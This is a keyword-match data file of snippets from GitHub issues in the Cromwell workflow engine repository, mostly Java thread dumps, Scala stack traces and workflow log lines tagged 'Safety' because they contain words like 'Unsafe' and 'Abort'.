java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-10"" #70 prio=5 os_prio=31 tid=0x00007fb76bac5800 nid=0xb503 waiting on condition [0x0000000132fa6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:9445,Unsafe,Unsafe,9445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"76bac5800 nid=0xb503 waiting on condition [0x0000000132fa6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-9"" #69 prio=5 os_prio=31 tid=0x00007fb76f36d800 nid=0xb303 waiting on condition [0x000000012c1b6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronize",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:11202,Unsafe,Unsafe,11202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronize",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:12958,Unsafe,Unsafe,12958,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"76f36d800 nid=0xb303 waiting on condition [0x000000012c1b6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronize",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:12080,Unsafe,Unsafe,12080,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronize",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:13836,Unsafe,Unsafe,13836,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-20"" #61 daemon prio=5 os_prio=31 tid=0x00007fb76b1f9000 nid=0xa303 waiting on condition [0x00000001325df000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$C",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:14714,Unsafe,Unsafe,14714,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"7fb76d42b000 nid=0xa103 waiting on condition [0x0000000132168000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-19"" #59 daemon prio=5 os_prio=31 tid=0x00007fb770631000 nid=0x9f03 waiting on condition [0x00000001324dc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-18"" #58 daemon prio=5 os_prio=31 tid=0x00007fb770630800 nid=0x9d03 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:17543,Unsafe,Unsafe,17543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"7fb76e95e000 nid=0x9b03 waiting on condition [0x00000001322d6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-17"" #56 daemon prio=5 os_prio=31 tid=0x00007fb76b6b6000 nid=0x9903 waiting on condition [0x0000000131db9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-16"" #55 daemon prio=5 os_prio=31 tid=0x00007fb76e92f000 nid=0x9703 waiting on condition [0x00",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:20573,Unsafe,Unsafe,20573,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"7fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-20"" #61 daemon prio=5 os_prio=31 tid=0x00007fb76b1f9000 nid=0xa303 waiting on condition [0x00000001325df000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-4"" #60 prio=5 os_prio=31 tid=0x00007fb76d42b000 nid=0xa103 waiting on condition [0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:15589,Unsafe,Unsafe,15589,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"8,130 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: Starting calls: printHelloAndGoodbye.echoHelloWorld:NA:1; 2016-09-09 15:50:58,138 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - EJEA_aed1aad8:printHelloAndGoodbye.echoHelloWorld:-1:1: Effective call caching mode: CallCachingOff; 2016-09-09 15:50:58,139 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionPendingState to WorkflowExecutionInProgressState.; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from ExecutingWorkflowState to WorkflowAbortingState; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor [UUID(aed1aad8)]: Abort received. Aborting 1 EJEAs; 2016-09-09 15:51:00,402 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionInProgressState to WorkflowExecutionAbortingState.; 2016-09-09 15:51:00,416 cromwell-system-akka.dispatchers.backend-dispatcher-29 ERROR - Unexpected message KvKeyLookupFailed(KvGet(ScopedKey(aed1aad8-588d-4f84-aa09-da0f663d68c0,KvJobKey(printHelloAndGoodbye.echoHelloWorld,None,1),__jes_operation_id))).; 2016-09-09 15:51:01,316 INFO - JesRun [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JES Run ID is operations/EI6qg4TxKhid_JjDtaqaiegBINHtgZmgHSoPcHJvZHVjdGlvblF1ZXVl; 2016-09-09 15:51:01,532 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodby",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:4290,Abort,Abort,4290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,1,['Abort'],['Abort']
Safety,"8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:21,618 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:26,639 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:31,658 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:36,678 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:41,699 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:46,719 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:5235,Abort,Abort,5235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,7,['Abort'],['Abort']
Safety,91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2514,unsafe,unsafeToFuture,2514,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['unsafe'],['unsafeToFuture']
Safety,"9:25:20,10] [error] WorkflowManagerActor Workflow 1ed0e19c-fa18-4241-8f6b-0b72e181f59a failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockCon",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:1963,unsafe,unsafeToFuture,1963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['unsafe'],['unsafeToFuture']
Safety,:+1: ; (Was just thinking that a `def descendants: Seq[Scope]` in `Scope` could prove useful to avoid having to pile up every Scope subtype when we need all the descendant for a workflow.),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/144#issuecomment-133451182:96,avoid,avoid,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/144#issuecomment-133451182,1,['avoid'],['avoid']
